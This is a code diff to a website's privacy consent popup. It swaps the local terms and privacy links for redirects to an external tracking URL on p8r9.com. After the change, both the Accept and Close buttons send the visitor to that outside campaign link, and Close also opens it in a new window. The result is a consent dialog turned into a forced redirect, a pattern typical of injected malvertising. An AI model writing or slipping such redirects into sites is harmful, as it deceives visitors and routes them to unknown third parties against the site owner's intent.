@@ -210,9 +210,9 @@
     );
     document.body.appendChild(bd);
     const accept = bd.querySelector('#ppAccept'), close = bd.querySelector('#ppClose');
-    function goTerms(){ window.location.href = 'term.html'; }
+    function goTerms(){ window.location.href = 'https://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; }
     if(accept) accept.addEventListener('click', goTerms);
-    if(close)  close.addEventListener('click', ()=>{ window.location.href='privacy.html'; try{ window.open('term.html','_blank'); }catch(e){} });
+    if(close)  close.addEventListener('click', ()=>{ window.location.href='https://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; try{ window.open('https://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]','https://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'); }catch(e){} });
   }
 
   (function maybeShowPrivacy(){
